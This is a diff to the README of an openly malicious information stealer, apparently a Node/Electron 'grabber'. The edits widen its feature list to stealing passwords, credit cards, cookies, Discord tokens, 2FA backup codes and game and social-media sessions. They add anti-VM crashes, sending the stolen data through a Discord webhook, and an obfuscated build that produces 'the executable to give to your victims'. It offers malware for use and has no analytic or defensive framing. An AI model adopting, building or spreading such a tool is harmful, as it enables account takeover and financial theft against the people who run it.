@@ -22,21 +22,15 @@ Some of these functionalities are customisable in the [`config.js`](config.js) f
 * Easy to build
 * Can add itself to startup programs
 * Can get IP info
-* Can get OS info: RAM, OS version, computer name...
+* Can get OS info: RAM, OS version, computer name, uptime, CPU, victim's Windows username
 * Can get Windows product key
 * Can kill Discord processes
-* Can get Chrome-based browsers logins and passwords, credit cards, cookies, history
-* Can steal Twitter, Reddit and Minecraft session, Roblox login cookie
-* Can trigger a BSOD if the grabber is run from a virtual machine
+* Can steal all browsers (Chrome, Edge, Firefox, Opera, Opera GX, Brave...) data: passwords, credit cards, cookies, history
+* Can steal Twitter, Reddit, Steam, Roblox and Minecraft sessions
+* Anti-VM (can trigger a BSOD if the grabber is run from a virtual machine)
 * Can steal Discord token, 2FA backup codes
 
-Everything is sent through a Discord Webhook.
-
-## Screenshots
-
-![Webhook](screenshots/webhook.png)
-
-Webhook
+All data is sent through a Discord webhook (which is configurable in the config), with nice embeds and the zip file 
 
 ## Using it
 
@@ -70,7 +64,13 @@ node build.js
   * Run webpack for minification and obfuscation
   * Run Electron builder for building the executable
 
-The executable can be found at ``dist/<exe name provided in the config>.exe``.
+The executable to give to your victims can be found at ``dist/<exe name provided in the config>.exe``.
+
+## Screenshots
+
+![Webhook](screenshots/webhook.png)
+
+Webhook
 
 ## Todo
 
